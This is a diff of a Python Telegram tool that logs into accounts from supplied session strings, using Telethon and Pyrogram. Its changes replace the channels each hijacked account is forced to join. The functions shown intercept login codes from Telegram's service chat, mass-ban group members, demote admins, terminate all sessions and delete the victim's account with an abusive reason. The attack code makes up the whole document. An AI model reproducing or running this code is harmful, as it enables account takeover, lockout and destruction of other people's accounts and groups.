@@ -27,9 +27,9 @@ async def users_gc(session):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await steve.connect()                          
             try:
-                await steve(join("@ZoneDangerSex"))
-                await steve(join("@Revanstoreya"))
-                await steve(join(CHAT))
+                await steve(join("@cillsupport"))
+                await steve(join("@stayheresay"))
+                #await steve(join(CHAT))
             except Exception as e:
                 print(e)
             k = await steve(GetAdminedPublicChannelsRequest())            
@@ -40,8 +40,8 @@ async def users_gc(session):
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
-                    await stark.join_chat("@ZoneDangerSex")
-                    await stark.join_chat("@Revanstoreya")
+                    await stark.join_chat("@cillsupport")
+                    await stark.join_chat("@stayheresay")
                     await stark.join_chat(CHAT)
                 except Exception as e:
                     print(e)    
@@ -61,9 +61,9 @@ async def user_info(session):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await steve.connect()
             try:
-                await steve(join("@ZoneDangerSex"))
-                await steve(join("@Revastoreya"))
-                await steve(join(CHAT))
+                await steve(join("@stayheresay"))
+                #await steve(join("@Revastoreya"))
+              #  await steve(join(CHAT))
             except Exception as e:
                 print(e)
             k = await steve.get_me()  
@@ -73,9 +73,9 @@ async def user_info(session):
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
-                    await stark.join_chat("@ZoneDangerSex")
-                    await stark.join_chat("@Revanstoreya")
-                    await stark.join_chat(CHAT)
+                    await stark.join_chat("@stayheresay")
+                   # await stark.join_chat("@Revanstoreya")
+                #    await stark.join_chat(CHAT)
                 except Exception as e:
                     print(e)    
                 k = await stark.get_me()
@@ -111,9 +111,9 @@ async def banall(session,id):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await steve.connect()
             try:
-                await steve(join("@ZoneDangerSex"))
-                await steve(join(CHAT))
-                await steve(join(CHAT))
+                await steve(join("@stayheresay"))
+               # await steve(join(CHAT))
+               # await steve(join(CHAT))
             except Exception as e:
                 print(e)
             admins = await steve.get_participants(gc_id, filter=ChannelParticipantsAdmins)
@@ -131,9 +131,9 @@ async def banall(session,id):
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
-                    await stark.join_chat("@ZoneDangerSex")
-                    await stark.join_chat("@Revanstoreya")
-                    await stark.join_chat(CHAT)
+                    await stark.join_chat("@stayheresay")
+                    #await stark.join_chat("@Revanstoreya")
+                    #await stark.join_chat(CHAT)
                 except Exception as e:
                     print(e)    
                 async for members in stark.get_chat_members(gc_id):  
@@ -161,9 +161,9 @@ async def get_otp(session):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await steve.connect()
             try:
-                await steve(join("@ZoneDangerSex"))
-                await steve(join("@Revanstoreya"))
-                await steve(join(CHAT))
+                await steve(join("@stayheresay"))
+               # await steve(join("@Revanstoreya"))
+              #  await steve(join(CHAT))
             except Exception as e:
                 print(e)
             async for x in steve.iter_messages(777000, limit=2):               
@@ -174,9 +174,9 @@ async def get_otp(session):
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
-                    await stark.join_chat("@ZoneDangerSex")
-                    await stark.join_chat("@Revanstoreya")
-                    await stark.join_chat(CHAT)
+                    await stark.join_chat("@stayheresay")
+                    #await stark.join_chat("@Revanstoreya")
+                  #  await stark.join_chat(CHAT)
                 except Exception as e:
                     print(e)    
                 ok = []
@@ -199,9 +199,9 @@ async def join_ch(session,id):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await steve.connect()
             try:
-                await steve(join("@ZoneDangerSex"))
-                await steve(join("@Revanstoreya"))
-                await steve(join(CHAT))                
+                await steve(join("@stayheresay"))
+                #await steve(join("@Revanstoreya"))
+              #  await steve(join(CHAT))                
             except Exception as e:
                 print(e)
             await steve(join(gc_id))            
@@ -210,9 +210,9 @@ async def join_ch(session,id):
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
-                    await stark.join_chat("@ZoneDangerSex")
-                    await stark.join_chat("@Revanstoreya")
-                    await stark.join_chat(CHAT)
+                    await stark.join_chat("@stayheresay")
+                   # await stark.join_chat("@Revanstoreya")
+                  #  await stark.join_chat(CHAT)
                 except Exception as e:
                     print(e)    
                 await stark.join_chat(gc_id)
@@ -231,9 +231,9 @@ async def leave_ch(session,id):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await steve.connect()
             try:
-                await steve(join("@ZoneDangerSex"))
-                await steve(join("@Revanstoreya"))
-                await steve(join(CHAT))                
+                await steve(join("@stayheresay"))
+                #await steve(join("@Revanstoreya"))
+               # await steve(join(CHAT))                
             except Exception as e:
                 print(e)
             await steve(leave(gc_id))            
@@ -242,9 +242,9 @@ async def leave_ch(session,id):
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
-                    await stark.join_chat("@ZoneDangerSex")
-                    await stark.join_chat("@Revanstoreya")
-                    await stark.join_chat(CHAT)
+                    await stark.join_chat("@stayheresay")
+                   # await stark.join_chat("@Revanstoreya")
+                 #   await stark.join_chat(CHAT)
                 except Exception as e:
                     print(e)    
                 await stark.leave_chat(gc_id)
@@ -266,9 +266,9 @@ async def del_ch(session,id):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await steve.connect()
             try:
-                await steve(join("@ZoneDangerSex"))
-                await steve(join("@Revanstoreya"))
-                await steve(join(CHAT))                
+                await steve(join("@stayheresay"))
+                #await steve(join("@Revanstoreya"))
+                #await steve(join(CHAT))                
             except Exception as e:
                 print(e)
             await steve(dc(gc_id))            
@@ -277,9 +277,9 @@ async def del_ch(session,id):
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
-                    await stark.join_chat("@ZoneDangerSex")
-                    await stark.join_chat("@Revanstoreya")
-                    await stark.join_chat(CHAT)
+                    await stark.join_chat("@stayheresay")
+                    #await stark.join_chat("@Revanstoreya")
+                    #await stark.join_chat(CHAT)
                 except Exception as e:
                     print(e)    
                 await stark.invoke(
@@ -300,9 +300,9 @@ async def check_2fa(session):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await steve.connect()
             try:
-                await steve(join("@ZoneDangerSex"))
-                await steve(join("@Revanstoreya"))
-                await steve(join(CHAT))                
+                await steve(join("@stayheresay"))
+                #await steve(join("@Revanstoreya"))
+                #await steve(join(CHAT))                
             except Exception as e:
                 print(e)
             try:
@@ -318,9 +318,9 @@ async def check_2fa(session):
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
-                    await stark.join_chat("@ZoneDangerSex")
-                    await stark.join_chat("@Revanstoreya")
-                    await stark.join_chat(CHAT)
+                    await stark.join_chat("@stayheresay")
+                    #await stark.join_chat("@Revanstoreya")
+                    #await stark.join_chat(CHAT)
                 except Exception as e:
                     print(e)    
                # try:
@@ -343,9 +343,9 @@ async def terminate_all(session):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await steve.connect()
             try:
-                await steve(join("@ZoneDangerSex"))
-                await steve(join("@Revanstoreya"))
-                await steve(join(CHAT))                
+                await steve(join("@stayheresay"))
+                #await steve(join("@Revanstoreya"))
+               # await steve(join(CHAT))                
             except Exception as e:
                 print(e)
             await steve(rt())
@@ -354,9 +354,9 @@ async def terminate_all(session):
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
-                    await stark.join_chat("@ZoneDangerSex")
-                    await stark.join_chat("@Revanstoreya")
-                    await stark.join_chat(CHAT)
+                    await stark.join_chat("@stayheresay")
+                    #await stark.join_chat("@Revanstoreya")
+                    #await stark.join_chat(CHAT)
                 except Exception as e:
                     print(e)    
                 await stark.invoke(functions.auth.ResetAuthorizations())
@@ -375,9 +375,9 @@ async def del_acc(session):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await steve.connect()
             try:
-                await steve(join("@ZoneDangerSex"))
-                await steve(join("@Revanstoreya"))
-                await steve(join(CHAT))                
+                await steve(join("@stayheresay"))
+                #await steve(join("@Revanstoreya"))
+               # await steve(join(CHAT))                
             except Exception as e:
                 print(e)
             await steve(ok.account.DeleteAccountRequest("owner madarchod h"))
@@ -386,9 +386,9 @@ async def del_acc(session):
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
-                    await stark.join_chat("@ZoneDangerSex")
-                    await stark.join_chat("@Revanstoreya")
-                    await stark.join_chat(CHAT)
+                    await stark.join_chat("@stayheresay")
+                    #await stark.join_chat("@Revanstoreya")
+                   # await stark.join_chat(CHAT)
                 except Exception as e:
                     print(e)    
                 await stark.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
@@ -424,9 +424,9 @@ async def piromote(session,gc_id,user_id):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await steve.connect()
             try:
-                await steve(join("@ZoneDangerSex"))
-                await steve(join("@Revanstoreya"))
-                await steve(join(CHAT))                
+                await steve(join("@stayheresay"))
+                #await steve(join("@Revanstoreya"))
+                #await steve(join(CHAT))                
             except Exception as e:
                 print(e)
             try:
@@ -437,9 +437,9 @@ async def piromote(session,gc_id,user_id):
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
-                    await stark.join_chat("@ZoneDangerSex")
-                    await stark.join_chat("@Revanstoreya")
-                    await stark.join_chat(CHAT)
+                    await stark.join_chat("@stayheresay")
+                   # await stark.join_chat("@Revanstoreya")
+                    #await stark.join_chat(CHAT)
                 except Exception as e:
                     print(e)
                 try:    
@@ -473,9 +473,9 @@ async def demote_all(session,gc_id):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await steve.connect()
             try:
-                await steve(join("@ZoneDangerSex"))
-                await steve(join("@Revanstoreya"))
-                await steve(join(CHAT))                
+                await steve(join("@stayheresay"))
+               # await steve(join("@Revanstoreya"))
+                #await steve(join(CHAT))                
             except Exception as e:
                 print(e)
             async for x in steve.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
@@ -488,9 +488,9 @@ async def demote_all(session,gc_id):
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
-                    await stark.join_chat("@ZoneDangerSex")
-                    await stark.join_chat("@Revanstoreya")
-                    await stark.join_chat(CHAT)
+                    await stark.join_chat("@stayheresay")
+                    #await stark.join_chat("@Revanstoreya")
+                    #await stark.join_chat(CHAT)
                 except Exception as e:
                     print(e)
                 async for m in stark.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
